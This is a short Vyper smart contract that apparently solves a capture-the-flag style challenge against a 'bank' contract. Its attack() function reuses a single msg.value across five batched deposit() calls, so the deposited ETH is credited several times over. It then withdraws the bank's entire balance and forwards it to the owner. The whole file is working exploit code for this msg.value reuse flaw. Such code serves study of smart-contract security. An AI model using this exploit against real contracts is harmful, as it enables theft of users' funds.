# @version ^0.3.7

owner: immutable(address)

bank: address

@external
@payable
def __init__(_bank: address):
    assert msg.value == as_wei_value(25, "ether"), "send ETH"
    owner = msg.sender
    self.bank = _bank

@external
def attack():
    assert msg.sender == owner, "!owner"
    eth_amount: uint256 = self.balance
    calls: DynArray[Bytes[4], 5] = []
    for _ in range(5):
        calls.append(method_id("deposit()"))

    raw_call(
        self.bank,
        _abi_encode(
            calls,
            True,
            method_id=method_id("batch(bytes[],bool)")
        ),
        value=self.balance,
    )
    raw_call(
        self.bank,
        _abi_encode(
            self.bank.balance,
            method_id=method_id("withdraw(uint256)")
        )  
    )
    send(owner, self.balance)

@external
@payable
def __default__():
    pass
